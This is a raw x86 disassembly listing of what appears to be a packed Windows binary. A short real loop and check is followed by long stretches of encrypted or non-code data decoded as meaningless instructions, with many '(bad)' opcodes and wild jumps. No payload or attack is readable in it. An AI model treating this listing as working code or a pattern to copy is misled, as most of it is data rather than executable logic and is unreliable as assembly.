  41807f:	jmp    0x418091
  418084:	mov    ecx,DWORD PTR ds:0x42901c
  41808a:	inc    ecx
  41808b:	mov    DWORD PTR ds:0x42901c,ecx
  418091:	cmp    DWORD PTR ds:0x42901c,0x17
  418098:	jae    0x4180e3
  41809e:	cmp    DWORD PTR ds:0x42901c,0xb
  4180a5:	jne    0x4180c4
  4180ab:	push   DWORD PTR [ebp-0x10]
  4180ae:	push   0x8d74
  4180b3:	push   0x428004
  4180b8:	push   DWORD PTR [ebp-0x10]
  4180bb:	push   DWORD PTR [ebp-0x14]
  4180be:	call   DWORD PTR ds:0x421000
  4180c4:	cmp    DWORD PTR ds:0x42901c,0xa
  4180cb:	jne    0x4180de
  4180d1:	mov    ecx,DWORD PTR ds:0x42901c
  4180d7:	inc    ecx
  4180d8:	mov    DWORD PTR ds:0x42901c,ecx
  4180de:	jmp    0x418084
  4180e3:	mov    ecx,0x3272db
  4180e8:	add    esi,ecx
  4180ea:	add    eax,ecx
  4180ec:	imul   eax,esi
  4180ef:	mov    esi,DWORD PTR [ebp+0xc]
  4180f2:	cmp    esi,eax
  4180f4:	jne    0x41a4c2
  4180fa:	mov    eax,DWORD PTR [ebp-0x4]
  4180fd:	mov    esi,DWORD PTR [ebp-0x8]
  418100:	xor    eax,edx
  418102:	jmp    0x41a4b4
  418107:	mov    esp,0x2510558f
  41810c:	sub    DWORD PTR fs:[ebx-0x5f],0xffffff83
  418111:	mov    al,0xb8
  418113:	push   edx
  418114:	jle    0x418185
  418116:	pop    es
  418117:	std    
  418118:	and    al,0x61
  41811a:	(bad)  
  41811b:	int    0x5f
  41811d:	bound  esp,QWORD PTR [edx+0x13]
  418120:	sbb    eax,DWORD PTR [edi+0x5a8599ca]
  418126:	iret   
  418127:	in     al,dx
  418128:	pop    ecx
  418129:	pop    ebp
  41812a:	and    bh,dh
  41812c:	dec    ebp
  41812d:	sub    dl,BYTE PTR [ebx]
  41812f:	cs in  al,0x3d
  418132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418133:	fwait
  418134:	add    eax,0x6f2661be
  418139:	sbb    DWORD PTR [esp+eiz*2+0x17],ecx
  41813d:	sbb    al,0xa9
  41813f:	add    ebp,DWORD PTR [edx+0x4ebf3c42]
  418145:	inc    esp
  418146:	push   es
  418147:	sub    dl,BYTE PTR [ecx+0x72]
  41814a:	sbb    BYTE PTR [ebp+ebp*1+0x66],0x80
  41814f:	lahf   
  418150:	loopne 0x4181a2
  418152:	enter  0x9584,0x86
  418156:	inc    ebx
  418157:	dec    edi
  418158:	ja     0x418124
  41815a:	or     ah,al
  41815c:	out    0x52,al
  41815e:	xchg   ebx,eax
  41815f:	mov    dl,0xc0
  418161:	jmp    0xa41944a0
  418166:	retf   
  418167:	adc    cl,BYTE PTR [ecx-0x1b2f084b]
  41816d:	and    al,0x70
  41816f:	sub    al,dh
  418171:	inc    eax
  418172:	adc    ecx,DWORD PTR [esi]
  418174:	aad    0x79
  418176:	cld    
  418177:	inc    eax
  418178:	mov    BYTE PTR [ebp+0x774c993a],dl
  41817e:	jb     0x418122
  418180:	adc    ebx,ebx
  418182:	cwde   
  418183:	pusha  
  418184:	or     al,0x8c
  418186:	mov    ds:0x38e5d873,al
  41818b:	test   DWORD PTR [edx-0x6c76249a],edi
  418191:	dec    ecx
  418192:	mov    bh,0xda
  418194:	dec    edx
  418195:	pop    edx
  418196:	sbb    bl,BYTE PTR [edi+0x1d9269e7]
  41819c:	sub    BYTE PTR [edi-0x7e],cl
  41819f:	in     eax,dx
  4181a0:	cmp    eax,0x174ac463
  4181a5:	test   BYTE PTR [edi+0x4b],cl
  4181a8:	enter  0xac11,0x23
  4181ac:	sub    BYTE PTR [ecx+0x254053c0],bl
  4181b2:	sahf   
  4181b3:	lea    esi,[esi+0x68fa0279]
  4181b9:	mov    esp,0x5a530092
  4181be:	cmp    esp,DWORD PTR [eax]
  4181c0:	inc    ebx
  4181c1:	xchg   edi,eax
  4181c2:	inc    ebx
  4181c3:	stc    
  4181c4:	push   0x31c4a398
  4181c9:	ss js  0x41821e
  4181cc:	data16 mov ds:0xb537d0cb,al
  4181d2:	retf   0xb366
  4181d5:	ja     0x418188
  4181d7:	push   edx
  4181d8:	inc    edx
  4181d9:	push   ebx
  4181da:	in     al,dx
  4181db:	stos   DWORD PTR es:[edi],eax
  4181dc:	xchg   ebx,eax
  4181dd:	adc    eax,DWORD PTR [edx+eax*2+0x7a]
  4181e1:	jno    0x418218
  4181e3:	retf   
  4181e4:	pop    ebp
  4181e5:	and    eax,0xc29cc29
  4181ea:	mov    al,0x76
  4181ec:	shl    BYTE PTR [edi-0x4403e162],0xd8
  4181f3:	mov    esi,0xf7d47349
  4181f8:	dec    eax
  4181f9:	ins    BYTE PTR es:[edi],dx
  4181fa:	cmp    bh,al
  4181fc:	xor    eax,0xcc26b5a
  418201:	ins    BYTE PTR es:[edi],dx
  418202:	in     al,dx
  418203:	mov    edi,0x95ec354
  418208:	cmp    al,0xd9
  41820a:	out    dx,al
  41820b:	mov    eax,0x9ff86bfc
  418210:	mov    ecx,0x13659e1c
  418215:	aas    
  418216:	or     dl,BYTE PTR [edi]
  418218:	mov    ebp,0x1b0a33e
  41821d:	sbb    al,0x6e
  41821f:	adc    al,0xe
  418221:	fnstcw WORD PTR [ebp-0x3b9e88dc]
  418227:	fistp  WORD PTR [edi]
  418229:	lahf   
  41822a:	mov    ds:0x20dcb43c,al
  41822f:	sbb    DWORD PTR [ebx+0xa3e67f2],esp
  418235:	mov    ebp,esp
  418237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418238:	jno    0x418273
  41823a:	cdq    
  41823b:	dec    esp
  41823c:	fdiv   st(2),st
  41823e:	dec    esi
  41823f:	mov    cl,BYTE PTR [esi]
  418241:	in     al,0x86
  418243:	pop    ss
  418244:	pop    esp
  418245:	dec    esi
  418246:	arpl   WORD PTR [esi+edx*8+0x5687c2a5],sp
  41824d:	fcom   QWORD PTR [bp+si-0x48f4]
  418252:	bound  edi,QWORD PTR [edx-0x63545387]
  418258:	fiadd  DWORD PTR [edx]
  41825a:	xor    eax,DWORD PTR cs:[ecx+0x6e]
  41825e:	push   ebp
  41825f:	mov    al,bl
  418261:	shl    eax,1
  418263:	ror    DWORD PTR [ebp+eiz*8+0x60dee1ee],cl
  41826a:	push   cs
  41826b:	fidivr DWORD PTR [ebx-0x7b7923a9]
  418271:	add    ecx,edx
  418273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418274:	jo     0x418204
  418276:	mov    ecx,DWORD PTR ds:0xf83e93ac
  41827c:	stos   DWORD PTR es:[edi],eax
  41827d:	mov    eax,ds:0x6ce53b98
  418282:	mov    ecx,DWORD PTR [eax+0x7c]
  418285:	inc    esp
  418286:	dec    ebx
  418287:	cmp    BYTE PTR [eax+0x6e],ah
  41828a:	repz pusha 
  41828c:	inc    edx
  41828d:	mov    edx,0x42ceffdd
  418292:	mov    WORD PTR [ebx+0x3c],es
  418295:	rcr    DWORD PTR [edx-0x31],0xdc
  418299:	mov    ds:0x3d59f614,al
  41829e:	in     al,dx
  41829f:	xor    DWORD PTR [ebp+0x7833f0d4],esi
  4182a5:	push   ebx
  4182a6:	sti    
  4182a7:	push   0x7c
  4182a9:	pop    ds
  4182aa:	adc    al,0xd8
  4182ac:	fs add eax,0x51302110
  4182b2:	xchg   esp,eax
  4182b3:	js     0x418259
  4182b5:	inc    ebp
  4182b6:	xchg   cl,ch
  4182b8:	mov    bl,0xbe
  4182ba:	and    ebx,0x9203dede
  4182c0:	jmp    0x418335
  4182c2:	add    al,0xd0
  4182c4:	add    al,0xcc
  4182c6:	push   edx
  4182c7:	test   BYTE PTR [edi],ah
  4182c9:	xchg   edx,eax
  4182ca:	les    edx,FWORD PTR [edx]
  4182cc:	rcl    BYTE PTR [eax-0xa5864a2],1
  4182d2:	jge    0x4182c9
  4182d4:	mov    ah,0xd4
  4182d6:	xor    DWORD PTR [edi-0x4a],ebx
  4182d9:	test   eax,0xb5e2f7c
  4182de:	jns    0x41834c
  4182e0:	loopne 0x4182b5
  4182e2:	mov    edi,0x81bb737a
  4182e7:	dec    esi
  4182e8:	push   edx
  4182e9:	mov    ah,0xe0
  4182eb:	sub    BYTE PTR [edx+0x2bcdfaf0],bh
  4182f1:	loop   0x4182c4
  4182f3:	or     dh,0x52
  4182f6:	test   BYTE PTR [esp+edx*1-0x441d31c8],cl
  4182fd:	add    esi,DWORD PTR [ecx+0x34863bd7]
  418303:	ja     0x41830d
  418305:	jge    0x418304
  418307:	adc    ecx,DWORD PTR [edx+0x77]
  41830a:	iret   
  41830b:	js     0x41833b
  41830d:	mov    es,WORD PTR [bx+di]
  418310:	repnz fisttp WORD PTR [edi]
  418313:	cmp    DWORD PTR [ebx+ebp*4-0x4fb2c043],esp
  41831a:	xor    al,0xb
  41831c:	out    0x38,al
  41831e:	cmp    BYTE PTR [ecx-0x5],al
  418321:	xlat   BYTE PTR ds:[ebx]
  418322:	mov    ds:0xe9d7f1dd,eax
  418327:	push   ebp
  418328:	xor    eax,0x11de5770
  41832d:	pop    ebx
  41832e:	leave  
  41832f:	hlt    
  418330:	in     al,dx
  418331:	aad    0x43
  418333:	shl    DWORD PTR [edx+ebp*8-0x13532484],cl
  41833a:	xor    eax,DWORD PTR [esi-0x35]
  41833d:	mov    DWORD PTR [esi+0x40091ff5],0x5d0f89fb
  418347:	adc    eax,0x91da60b7
  41834c:	push   edi
  41834d:	sti    
  41834e:	hlt    
  41834f:	mov    cl,0xce
  418351:	bswap  esi
  418353:	pop    esi
  418354:	sar    DWORD PTR [edi+0x4a],0xf3
  418358:	in     eax,0xc5
  41835a:	aad    0x4d
  41835c:	lods   eax,DWORD PTR ds:[esi]
  41835d:	pushf  
  41835e:	out    0xb9,al
  418360:	mov    ch,0xa3
  418362:	pop    edi
  418363:	test   DWORD PTR [edx-0x34],ecx
  418366:	inc    esp
  418367:	dec    ecx
  418368:	shl    dl,cl
  41836a:	mov    cl,0xf2
  41836c:	ins    DWORD PTR es:[edi],dx
  41836d:	or     BYTE PTR [ebx+0xa],ah
  418370:	mov    esp,0xd2932381
  418375:	xor    BYTE PTR [edx+0x77992135],ah
  41837b:	frstor [edi]
  41837d:	sti    
  41837e:	popf   
  41837f:	ds sub esi,edx
  418382:	fld    DWORD PTR [edx+ecx*8]
  418385:	or     esp,DWORD PTR [edi-0x79]
  418388:	push   ecx
  418389:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41838a:	sub    dl,ah
  41838c:	aad    0x53
  41838e:	xor    al,0x57
  418390:	adc    ebp,DWORD PTR [eax-0x6e]
  418393:	ss xchg edx,eax
  418395:	outs   dx,BYTE PTR ds:[si]
  418397:	sub    dl,bl
  418399:	dec    ecx
  41839a:	xlat   BYTE PTR ds:[ebx]
  41839b:	mov    eax,ds:0x87b7a0e0
  4183a0:	cmp    eax,0x28219a09
  4183a5:	xchg   ebx,eax
  4183a6:	xchg   edi,eax
  4183a7:	xchg   ebx,eax
  4183a8:	je     0x418395
  4183aa:	stos   BYTE PTR es:[edi],al
  4183ab:	dec    esi
  4183ac:	mov    bh,0xa1
  4183ae:	fucom  st(7)
  4183b0:	and    esi,DWORD PTR [ebx]
  4183b2:	or     DWORD PTR [edi],eax
  4183b4:	xor    BYTE PTR [ebp+0x31],cl
  4183b7:	pop    ds
  4183b8:	lea    esp,[eax+0x2c]
  4183bb:	sub    BYTE PTR ds:0x559d1bc1,cl
  4183c1:	xor    esp,edx
  4183c3:	cmp    BYTE PTR [edi],bl
  4183c5:	mov    dh,0x8f
  4183c7:	pop    esp
  4183c8:	fldenv [edx+ecx*8-0x48540c2f]
  4183cf:	fwait
  4183d0:	mov    esp,0x872addd2
  4183d5:	add    eax,0xdd11d8ec
  4183da:	mov    cx,sp
  4183dd:	stc    
  4183de:	mov    al,0xd8
  4183e0:	mov    esp,eax
  4183e2:	sbb    edi,DWORD PTR [ebx+0x32]
  4183e5:	sbb    al,0xb7
  4183e7:	mov    ch,BYTE PTR [edi]
  4183e9:	pop    ss
  4183ea:	out    dx,al
  4183eb:	or     DWORD PTR [eax-0x66],ecx
  4183ee:	(bad)  
  4183ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183f0:	enter  0x7eb6,0x95
  4183f4:	xchg   esp,eax
  4183f5:	call   0x5e63:0x3c022687
  4183fc:	stc    
  4183fd:	cmp    DWORD PTR [edx],eax
  4183ff:	push   0xdb9a036e
  418404:	or     bl,BYTE PTR ds:0xeaab6677
  41840a:	loop   0x4183d3
  41840c:	inc    ecx
  41840d:	and    esp,ebx
  41840f:	add    al,0x4e
  418411:	jno    0x4183ec
  418413:	scas   al,BYTE PTR es:[edi]
  418414:	scas   eax,DWORD PTR es:[edi]
  418415:	lahf   
  418416:	dec    eax
  418417:	mov    edi,0x3fd5cdb2
  41841c:	push   eax
  41841d:	lahf   
  41841e:	xchg   esi,eax
  41841f:	dec    esi
  418420:	mov    edi,0x75f2127e
  418425:	rol    DWORD PTR [eax-0x1b],1
  418428:	cmc    
  418429:	test   BYTE PTR [eax],bh
  41842b:	mov    edx,0xad8cb0ec
  418430:	sti    
  418431:	dec    edi
  418432:	fadd   DWORD PTR [esi-0xc]
  418435:	mov    al,0x36
  418437:	outs   dx,BYTE PTR fs:[esi]
  418439:	mov    edx,0xbee33ac6
  41843e:	aaa    
  41843f:	or     DWORD PTR [esi],0x45
  418442:	xchg   edx,eax
  418443:	(bad)  
  418444:	jnp    0x418444
  418446:	mov    DWORD PTR [ebx+0x217ce88e],ebp
  41844c:	jmp    0x4183e3
  41844e:	fs xchg esp,eax
  418450:	ror    DWORD PTR [ecx-0x4d],0x34
  418454:	push   edi
  418455:	pop    ebp
  418456:	cmc    
  418457:	or     eax,ebx
  418459:	outs   dx,DWORD PTR ds:[esi]
  41845a:	scas   al,BYTE PTR es:[edi]
  41845b:	sahf   
  41845c:	jp     0x4184a3
  41845e:	sub    ebx,esp
  418460:	mov    ebp,0x5d8270bc
  418465:	dec    ecx
  418466:	and    BYTE PTR [eax+0x53],dh
  418469:	push   0x2c6dc07e
  41846e:	jnp    0x4184da
  418470:	add    bh,BYTE PTR [eax]
  418472:	aam    0xc2
  418474:	jmp    0x2b76df4b
  418479:	retf   0xacf1
  41847c:	imul   ebx,DWORD PTR [ebx-0x1d],0xc56c226b
  418483:	xchg   esi,eax
  418484:	sbb    ah,ah
  418486:	aas    
  418487:	outs   dx,BYTE PTR ds:[esi]
  418488:	clc    
  418489:	mov    edx,0xabe9d7f5
  41848e:	adc    al,0x69
  418490:	ror    dh,1
  418492:	call   0xdc5ec4a0
  418497:	sbb    ebp,DWORD PTR [ecx-0x1d1c127b]
  41849d:	adc    eax,0x73e69e16
  4184a2:	mov    esp,DWORD PTR [ecx+eiz*8+0x6c]
  4184a6:	rol    BYTE PTR [ecx+0x54673df3],0x1e
  4184ad:	out    0x65,eax
  4184af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184b0:	xchg   DWORD PTR [ecx+0x4c9cce48],ebx
  4184b6:	mov    al,0x93
  4184b8:	push   es
  4184b9:	ins    BYTE PTR es:[edi],dx
  4184ba:	sbb    BYTE PTR [eax],dl
  4184bc:	fdiv   DWORD PTR [di-0x2117]
  4184c1:	out    0xf5,eax
  4184c3:	xchg   edi,eax
  4184c4:	test   BYTE PTR [eax-0x72d6c68],bl
  4184ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184cb:	cmp    bh,BYTE PTR [ecx]
  4184cd:	dec    edx
  4184ce:	jge    0x4184af
  4184d0:	es pushf 
  4184d2:	sub    BYTE PTR [edi-0x10c215cd],0x62
  4184d9:	stos   DWORD PTR es:[edi],eax
  4184da:	xchg   esp,eax
  4184db:	add    esp,esi
  4184dd:	push   0xb150d9dc
  4184e2:	mov    eax,ds:0x6914805b
  4184e7:	loop   0x4184eb
  4184e9:	or     bh,BYTE PTR [ebp-0x612d38da]
  4184ef:	sbb    esp,ecx
  4184f1:	stos   BYTE PTR es:[edi],al
  4184f2:	mov    edx,0x7089eee9
  4184f7:	push   ds
  4184f8:	mov    ch,0xd5
  4184fa:	or     eax,0x7b85a1b7
  4184ff:	inc    esp
  418500:	xchg   ebp,eax
  418501:	imul   ebx,DWORD PTR [ebx-0x3fb4988f],0x2
  418508:	mov    eax,DWORD PTR [ebx-0x66]
  41850b:	outs   dx,BYTE PTR ds:[esi]
  41850c:	inc    ebx
  41850d:	sub    di,bp
  418510:	imul   edi,ebp,0x26
  418513:	cmp    eax,0xb4d6750e
  418518:	and    esi,DWORD PTR [edx+0x53cd3ee4]
  41851e:	mov    dl,0x78
  418520:	pusha  
  418521:	(bad)  
  418522:	scas   eax,DWORD PTR es:[edi]
  418523:	dec    eax
  418524:	hlt    
  418525:	jmp    0x31d1b513
  41852a:	int3   
  41852b:	jne    0x4184e8
  41852d:	sbb    eax,0x2376924c
  418532:	fisubr DWORD PTR [edx+0x7f1d5060]
  418538:	mov    WORD PTR [ebx-0x68],ds
  41853b:	stc    
  41853c:	pop    ebp
  41853d:	sub    BYTE PTR [edx-0x13],ch
  418540:	jge    0x418560
  418542:	les    edi,FWORD PTR [ebx+0x49]
  418545:	aaa    
  418546:	in     eax,0x3c
  418548:	pop    eax
  418549:	adc    eax,0x9ec347d
  41854e:	ja     0x4184ed
  418550:	stos   DWORD PTR es:[edi],eax
  418551:	int3   
  418552:	jmp    0x4184fc
  418554:	inc    esi
  418555:	enter  0xcd19,0x48
  418559:	cmp    DWORD PTR [ecx-0x49],eax
  41855c:	mov    al,ds:0xd21a14a
  418561:	daa    
  418562:	push   esi
  418563:	add    BYTE PTR [ecx+ebx*1+0x1],0x84
  418568:	scas   al,BYTE PTR es:[edi]
  418569:	jle    0x418544
  41856b:	inc    ebx
  41856c:	jge    0x4185be
  41856e:	mov    ebp,0x1d8cab33
  418573:	xchg   ecx,eax
  418574:	dec    edx
  418575:	in     eax,dx
  418576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418577:	or     DWORD PTR [eax-0x2b],ebx
  41857a:	pop    ds
  41857b:	add    eax,0x1219a753
  418580:	out    dx,al
  418581:	jg     0x41858c
  418583:	adc    al,0xba
  418585:	pop    esi
  418586:	mov    ebx,DWORD PTR [ecx-0x4c]
  418589:	mov    ebx,0x4484211a
  41858e:	jmp    0x4185d3
  418590:	mov    bl,al
  418592:	stc    
  418593:	or     BYTE PTR [eax+edx*1],al
  418596:	das    
  418597:	test   BYTE PTR [ebp+eax*1+0x6335b99f],bl
  41859e:	or     ebp,DWORD PTR [ebp-0x5f39f98f]
  4185a4:	(bad)  
  4185a5:	arpl   WORD PTR [ecx],sp
  4185a7:	sub    dl,BYTE PTR [esi-0x5c]
  4185aa:	jl     0x4185df
  4185ac:	adc    ebp,eax
  4185ae:	mov    eax,ds:0x2bc7f4a
  4185b3:	dec    esp
  4185b4:	xchg   BYTE PTR [esi+edi*8-0x47],al
  4185b8:	mov    esp,0x578794fc
  4185bd:	jnp    0x418621
  4185bf:	or     edi,ebp
  4185c1:	fnsave [edi+0x5dea3c38]
  4185c7:	mov    ch,0x22
  4185c9:	sbb    DWORD PTR [ecx-0x40e6485],ebx
  4185cf:	xor    BYTE PTR [edx+0x72c4b51e],dl
  4185d5:	xor    bh,dh
  4185d7:	outs   dx,BYTE PTR ds:[esi]
  4185d8:	xor    edi,DWORD PTR [ebx-0x21]
  4185db:	jle    0x418631
  4185dd:	out    dx,eax
  4185de:	in     al,0x7
  4185e0:	sbb    ah,BYTE PTR ds:0x699b2ae3
  4185e6:	pop    edi
  4185e7:	daa    
  4185e8:	fldenv [eax-0x4fc23fd6]
  4185ee:	pop    ecx
  4185ef:	push   edx
  4185f0:	sbb    esi,DWORD PTR [eax+0x24daa429]
  4185f6:	adc    dh,bl
  4185f8:	pop    esi
  4185f9:	(bad)
  4185fc:	retf   0x843f
  4185ff:	lods   al,BYTE PTR ds:[esi]
  418600:	out    0xce,al
  418602:	add    BYTE PTR [ebx-0x29a5452c],ah
  418608:	jp     0x418671
  41860a:	arpl   sp,sp
  41860c:	data16 jecxz 0x418619
  41860f:	inc    edx
  418610:	dec    esi
  418611:	adc    ch,BYTE PTR [ebx]
  418613:	mov    cl,0x77
  418615:	sbb    bl,BYTE PTR [eax]
  418617:	mov    ah,0x3a
  418619:	in     eax,dx
  41861a:	xor    dh,BYTE PTR ds:0x12f729f3
  418620:	and    ebp,DWORD PTR [ebx+0x767205a1]
  418626:	cmp    al,0xc7
  418628:	sbb    bl,al
  41862a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41862b:	out    0x52,al
  41862d:	shl    BYTE PTR [ebx+eax*2+0x5],cl
  418631:	sub    eax,0x3c7ca307
  418636:	jl     0x4185d7
  418638:	fwait
  418639:	xor    ecx,ebp
  41863b:	outs   dx,DWORD PTR ds:[esi]
  41863c:	jbe    0x41863e
  41863e:	push   ss
  41863f:	dec    edi
  418640:	retf   0xb637
  418643:	xchg   ebx,eax
  418644:	adc    BYTE PTR [ebx+0x10dafe80],ah
  41864a:	push   es
  41864b:	fmul   st(7),st
  41864d:	ja     0x4185fb
  41864f:	mov    eax,ds:0x9b22bdfd
  418654:	xor    DWORD PTR [eax],edx
  418656:	xlat   BYTE PTR ds:[ebx]
  418657:	xchg   esi,eax
  418658:	jns    0x418664
  41865a:	clc    
  41865b:	int    0xb0
  41865d:	je     0x418629
  41865f:	popa   
  418660:	sar    DWORD PTR [ebx+0x7f],0x82
  418664:	ret    
  418665:	(bad)  [edx+ecx*8]
  418668:	and    ebx,ebx
  41866a:	mov    bl,0x16
  41866c:	mov    bl,0x1c
  41866e:	std    
  41866f:	retf   
  418670:	pop    ds
  418671:	stc    
  418672:	jne    0x4186a7
  418674:	jp     0x418645
  418676:	add    BYTE PTR [edx],ch
  418678:	xchg   esp,eax
  418679:	jo     0x4186d4
  41867b:	mov    al,ds:0x5111739e
  418680:	outs   dx,DWORD PTR ds:[esi]
  418681:	cmp    bh,bh
  418683:	xchg   BYTE PTR [edx],ah
  418685:	xchg   DWORD PTR [edx+0x33556421],edi
  41868b:	sub    BYTE PTR [ebx+esi*2],ah
  41868e:	mov    ebx,edx
  418690:	rol    DWORD PTR [ebx],1
  418692:	cmc    
  418693:	ds ror ebp,1
  418696:	(bad)  
  418697:	loop   0x418633
  418699:	dec    ecx
  41869a:	arpl   WORD PTR [edi+esi*1+0x53c49ef],ax
  4186a1:	and    ecx,ebx
  4186a3:	loopne 0x41864e
  4186a5:	scas   eax,DWORD PTR es:[edi]
  4186a6:	xchg   BYTE PTR ds:0x8a66eb09,dh
  4186ac:	or     BYTE PTR [eax+0x3aae6bc6],0x38
  4186b3:	dec    edx
  4186b4:	adc    eax,0x98ab4b67
  4186b9:	mov    edx,0xc3178e6
  4186be:	cwde   
  4186bf:	(bad)  
  4186c0:	pop    esp
  4186c1:	aad    0xfa
  4186c3:	fs jg  0x4186ef
  4186c6:	int    0x3d
  4186c8:	(bad)  
  4186c9:	mov    eax,0x134e520f
  4186ce:	push   ecx
  4186cf:	mov    bl,0x1b
  4186d1:	das    
  4186d2:	mov    esp,0x74c6be69
  4186d7:	ja     0x4186ad
  4186d9:	lods   eax,DWORD PTR ds:[esi]
  4186da:	dec    edx
  4186db:	and    al,0x39
  4186dd:	or     BYTE PTR [ebp+0x26a375e4],ch
  4186e3:	pop    esp
  4186e4:	shl    BYTE PTR [ebx+0x5a953b50],cl
  4186ea:	cmp    DWORD PTR [esi+0x3164da0f],0xb6a8799d
  4186f4:	shr    DWORD PTR [ecx],cl
  4186f6:	cmc    
  4186f7:	adc    DWORD PTR [ecx+ecx*8],0x4ff1e577
  4186fe:	sub    esi,eax
  418700:	mov    esp,0xa049efd6
  418705:	int3   
  418706:	test   eax,0x29475d26
  41870b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41870c:	pop    ebx
  41870d:	cmp    BYTE PTR [ebx+0x2d418eec],dh
  418713:	cwde   
  418714:	stos   DWORD PTR es:[edi],eax
  418715:	add    BYTE PTR ds:0x242cae38,dl
  41871b:	mov    DWORD PTR [edi+0x18],edx
  41871e:	fldcw  WORD PTR [ebx]
  418720:	ss pop ebx
  418722:	and    al,0x62
  418724:	push   eax
  418725:	fsub   DWORD PTR [esi]
  418727:	jg     0x4187a8
  418729:	push   es
  41872a:	jecxz  0x418725
  41872c:	pushf  
  41872d:	aad    0xf
  41872f:	popa   
  418730:	ins    DWORD PTR es:[edi],dx
  418731:	xchg   esi,eax
  418732:	loop   0x41877a
  418734:	sbb    eax,DWORD PTR [ebp-0x13cbf260]
  41873a:	(bad)  
  41873b:	push   ds
  41873c:	or     cl,dh
  41873e:	mov    cl,BYTE PTR [edx-0x49]
  418741:	adc    BYTE PTR [ebx+0x17],ch
  418744:	xor    BYTE PTR [esi],0x6f
  418747:	loope  0x4187c8
  418749:	inc    edi
  41874a:	pavgw  mm1,QWORD PTR [ecx-0x59]
  41874e:	test   al,0xda
  418751:	inc    esp
  418752:	(bad)  
  418753:	(bad)  
  418754:	cmp    DWORD PTR [edi],esp
  418756:	push   esi
  418757:	mov    esp,0x3a3209c
  41875c:	push   0xa19bd532
  418761:	pop    esi
  418762:	ss sbb cl,dl
  418765:	(bad)  
  418766:	and    al,0x1d
  418768:	mov    esi,0xb9f7645
  41876d:	pushf  
  41876e:	xchg   ebx,eax
  41876f:	lock imul ebp,DWORD PTR [ecx+edx*2-0x3b],0xfffffff5
  418775:	aas    
  418776:	and    ebx,eax
  418778:	or     al,0x7d
  41877a:	cdq    
  41877b:	sub    BYTE PTR [esp+ecx*8+0x7e],ah
  41877f:	and    cl,dh
  418781:	cli    
  418782:	ja     0x4187a4
  418784:	cmp    ebx,DWORD PTR [edi+0xec8d38f]
  41878a:	das    
  41878b:	mov    cl,0x8d
  41878d:	fwait
  41878e:	mov    edi,ecx
  418790:	mov    ch,0xf9
  418792:	and    BYTE PTR [esi+0x38],0x55
  418796:	sti    
  418797:	adc    eax,0xec9442cc
  41879c:	in     eax,0x51
  41879e:	lahf   
  41879f:	pop    ss
  4187a0:	dec    ebp
  4187a1:	add    BYTE PTR [eax-0x5f],0xa4
  4187a5:	or     BYTE PTR [esi+eax*8],bl
  4187a8:	iret   
  4187a9:	rol    DWORD PTR [ebx+0x4f],0xe4
  4187ad:	mov    cs,WORD PTR [esi]
  4187af:	out    0xe8,eax
  4187b1:	(bad)
  4187b4:	sbb    BYTE PTR [edx+0x5de236c2],ch
  4187ba:	imul   edx,ebx,0x3d257b91
  4187c0:	int    0xe0
  4187c2:	nop
  4187c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187c4:	(bad)  
  4187c5:	adc    BYTE PTR [edi-0x77803ba8],ch
  4187cb:	out    0xa1,al
  4187cd:	popa   
  4187ce:	or     ecx,ebp
  4187d0:	outs   dx,DWORD PTR ds:[esi]
  4187d1:	addr16 aam 0x58
  4187d4:	inc    edi
  4187d5:	adc    ebp,ebx
  4187d7:	jnp    0x418773
  4187d9:	js     0x4187a0
  4187db:	shr    DWORD PTR [esi+0x4993ade5],cl
  4187e1:	scas   eax,DWORD PTR es:[edi]
  4187e2:	dec    ebx
  4187e3:	add    eax,0x1b1fff62
  4187e8:	ss (bad) 
  4187ea:	sahf   
  4187eb:	mov    al,0x68
  4187ed:	pushf  
  4187ee:	test   esp,0x60cdd9c8
  4187f4:	fisttp WORD PTR [eax+0x5]
  4187f7:	mov    ebp,0x61fbf191
  4187fc:	push   esi
  4187fd:	jg     0x418858
  4187ff:	bound  esi,QWORD PTR [edx+ebx*8]
  418802:	sub    DWORD PTR [ebx],ecx
  418804:	enter  0xe530,0x26
  418808:	add    bl,BYTE PTR [ebx-0x35]
  41880b:	sbb    BYTE PTR [edx-0x10],bh
  41880e:	mov    bh,0x2c
  418810:	sbb    ch,BYTE PTR [ecx]
  418812:	xchg   ebp,eax
  418813:	add    al,0x58
  418815:	int    0x5d
  418817:	aad    0x9b
  418819:	mov    eax,ds:0x2a259e26
  41881e:	in     eax,0xa4
  418820:	xor    al,0x11
  418822:	sbb    cl,bh
  418824:	or     BYTE PTR [esi+esi*4-0x17],cl
  418828:	aaa    
  418829:	ds jbe 0x41888b
  41882c:	inc    ebp
  41882d:	mov    esi,0x22ea1d12
  418832:	mov    es,WORD PTR [edx]
  418834:	xchg   esp,eax
  418835:	jge    0x418830
  418837:	rol    DWORD PTR [edx-0x6f9e3ee2],0xcc
  41883e:	pop    esp
  41883f:	js     0x418851
  418841:	rcr    BYTE PTR [ebp-0x3],0xc7
  418845:	lods   eax,DWORD PTR ds:[esi]
  418846:	mov    bl,0x1c
  418848:	loopne 0x418833
  41884a:	imul   cl
  41884c:	fcomp  st(1)
  41884e:	mov    dh,0xc9
  418850:	aad    0xd2
  418852:	popa   
  418853:	inc    ecx
  418854:	ret    
  418855:	or     eax,0x877a9517
  41885a:	cmp    ch,cl
  41885c:	repz imul ecx,DWORD PTR [bx+si],0x13b9aad6
  418864:	jne    0x4188b7
  418866:	call   0xcf93:0xed37aefb
  41886d:	daa    
  41886e:	jno    0x418809
  418870:	aad    0x89
  418872:	mov    eax,ds:0x4a0281d
  418877:	mov    ebp,ebx
  418879:	xchg   BYTE PTR [edx],ch
  41887b:	fimul  WORD PTR [ebx+ebx*8]
  41887e:	cld    
  41887f:	ret    0x55f8
  418882:	ins    DWORD PTR es:[edi],dx
  418883:	add    ecx,ecx
  418885:	cmp    ah,BYTE PTR [eax+esi*1+0x34787c32]
  41888c:	add    eax,0x334a6d95
  418891:	push   es
  418892:	jo     0x418830
  418894:	pop    es
  418895:	push   ds
